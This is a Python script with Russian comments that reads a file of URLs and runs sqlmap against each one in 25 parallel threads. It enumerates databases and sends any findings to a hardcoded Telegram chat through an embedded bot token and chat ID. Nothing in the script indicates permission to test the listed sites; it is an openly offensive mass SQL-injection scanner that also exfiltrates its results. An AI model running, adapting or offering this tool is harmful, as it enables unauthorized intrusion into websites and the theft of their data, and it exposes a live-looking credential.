from concurrent.futures import ThreadPoolExecutor
import subprocess
import telebot
import os
from tqdm import tqdm

# Конфигурация Telegram
TELEGRAM_TOKEN = "8025308318:AAHmrfacGj-eO05vVwajnQYfts4gKqRaEgo"
CHAT_ID = "6519250395"
SCANNED_URLS_FILE = "scanned_urls.txt"

bot = telebot.TeleBot(TELEGRAM_TOKEN)

def send_to_telegram(message):
    try:
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

# Функция для запуска SQLmap
def run_sqlmap(url):
    try:
        print(f"Сканирую: {url}")
        result = subprocess.run(
            ["sqlmap", "-u", url, "--batch", "--random-agent", "--threads=10", "--dbs"],
            capture_output=True, text=True
        )
        output = result.stdout
        if "available databases" in output:  # Если найдены базы данных
            # Сохраняем результаты в файл
            with open("results.txt", "a") as file:
                file.write(f"Результаты для {url}:\n{output}\n{'='*50}\n")
            # Отправляем результаты в Telegram
            send_to_telegram(f"Найдены базы данных для {url}:\n{output[:3000]}")
            # Добавляем URL в файл просканированных
            with open(SCANNED_URLS_FILE, "a") as f:
                f.write(url + "\n")
        else:
            print(f"Нет уязвимостей на {url}")
    except Exception as e:
        send_to_telegram(f"Ошибка при сканировании {url}: {str(e)}")

# Чтение списка сайтов из файла
with open("filtered_urls.txt", "r") as f:
    urls = [line.strip() for line in f if line.strip()]

# Чтение просканированных URL
if os.path.exists(SCANNED_URLS_FILE):
    with open(SCANNED_URLS_FILE, "r") as f:
        scanned_urls = set(line.strip() for line in f if line.strip())
else:
    scanned_urls = set()

# Фильтрация URL для исключения уже просканированных
urls_to_scan = [url for url in urls if url not in scanned_urls]

# Ограничение на 5–10 одновременных потоков
MAX_WORKERS = 25

with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    list(tqdm(executor.map(run_sqlmap, urls_to_scan), total=len(urls_to_scan), desc="Сканирование сайтов", bar_format="{l_bar}{bar} [Осталось: {remaining}]"))

send_to_telegram("Сканирование завершено. Проверьте файл results.txt для всех данных.")